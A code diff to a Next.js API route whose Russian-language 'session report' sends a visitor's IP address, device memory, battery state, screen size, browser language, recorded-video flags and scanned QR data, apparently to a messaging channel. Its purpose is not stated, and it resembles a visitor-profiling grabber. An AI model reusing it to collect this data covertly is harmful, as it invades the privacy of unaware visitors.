@@ -14,6 +14,7 @@ export async function POST(req: NextRequest) {
 
   try {
     const {
+      timestamp, // Добавлено
       clientInfo,
       networkInfo,
       deviceMemory,
@@ -32,7 +33,11 @@ export async function POST(req: NextRequest) {
     // --- Construct Summary Message ---
     let summaryText = "📊 *Отчет о сессии*\n\n";
 
-    summaryText += "--- 📱 *Информация об устройстве* ---\n";
+    if (timestamp) {
+      summaryText += `*Время сессии:* ${new Date(timestamp).toLocaleString('ru-RU')}\n`; // Форматирование временной метки
+    }
+
+    summaryText += "\n--- 📱 *Информация об устройстве* ---\n";
     summaryText += `*IP:* \`${ipAddress}\`\n`;
     // User Agent удален по запросу
     if (clientInfo?.platform && clientInfo.platform !== "Недоступно") {
@@ -44,9 +49,15 @@ export async function POST(req: NextRequest) {
     if (deviceMemory && deviceMemory !== "Недоступно") {
       summaryText += `*Память устройства:* ${deviceMemory} GB\n`;
     }
+    if (clientInfo?.screenWidth && clientInfo.screenHeight) { // Добавлено
+      summaryText += `*Разрешение экрана:* ${clientInfo.screenWidth}x${clientInfo.screenHeight}\n`;
+    }
+    if (clientInfo?.browserLanguage) { // Добавлено
+      summaryText += `*Язык браузера:* ${clientInfo.browserLanguage}\n`;
+    }
     if (batteryInfo?.level !== undefined && batteryInfo.status !== "Not Supported") {
       summaryText += `*Батарея:* ${(batteryInfo.level * 100).toFixed(0)}% (${batteryInfo?.charging !== undefined ? (batteryInfo.charging ? "Заряжается" : "Не заряжается") : "Неизвестно"}) [Статус API: ${batteryInfo?.status || "Неизвестно"}]\n`;
-    } else if (batteryInfo?.status && batteryInfo.status !== "Available") {
+    } else if (batteryInfo?.status && batteryInfo.status !== "Available" && batteryInfo.status !== "Not Supported") {
       summaryText += `*Батарея:* ${batteryInfo.status}\n`;
     }
 
@@ -81,9 +92,13 @@ export async function POST(req: NextRequest) {
       summaryText += `*Видео 2 записано:* Да ✅\n`;
     }
     if (qrCodeData) {
-      summaryText += `*QR-код отсканирован:* Да ✅ (\`${qrCodeData}\`)\n`;
-    } else {
-      summaryText += `*QR-код отсканирован:* Нет ❌\n`;
+      if (qrCodeData === "QR Scan Timed Out") {
+        summaryText += `*QR-код:* Время сканирования истекло ⏳\n`; // Улучшенное сообщение
+      } else if (qrCodeData.startsWith("QR Scan Error:")) {
+        summaryText += `*QR-код:* Ошибка сканирования ❌ (${qrCodeData.replace("QR Scan Error: ", "")})\n`; // Улучшенное сообщение
+      } else {
+        summaryText += `*QR-код отсканирован:* Да ✅ (\`${qrCodeData}\`)\n`;
+      }
     }
     
     messages.push(
